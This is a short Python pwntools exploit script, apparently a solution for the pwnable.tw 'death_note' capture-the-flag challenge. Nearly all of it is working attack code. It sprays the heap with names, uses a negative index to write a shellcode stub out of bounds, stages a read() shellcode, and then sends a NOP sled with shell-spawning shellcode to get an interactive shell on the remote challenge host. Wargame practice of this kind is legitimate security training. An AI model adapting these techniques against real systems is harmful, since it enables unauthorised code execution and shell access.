#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import sys
context.binary = "./death_note"

if sys.argv[1] == "l":
    io = process("./death_note")

else:
    io = remote("chall.pwnable.tw", 10201, timeout = 300)

def addName(idx, name):
    io.sendlineafter("choice :", "1")
    io.sendlineafter("Index :", str(idx))
    io.sendlineafter("Name :", name)

if __name__ == "__main__":
    #  gdb.attach(io)
    for i in xrange((0x21e99 - 0x1c3f9) / 0x60 + 1):
        nop = 'a' * 0x50
        addName(0, nop)

    ret = asm('''
            pop ecx
            ''')
    ret += '\x78\x2a'
    ret = ret.ljust(0x20, 'a')

    read = asm(shellcraft.read(0, 'esp', 0x400))
    addName(-11, ret)
    io.sendlineafter("choice :", read)

    nops = '\x90' * 0x30
    io.sendline(nops + asm(shellcraft.sh()))

    io.interactive()
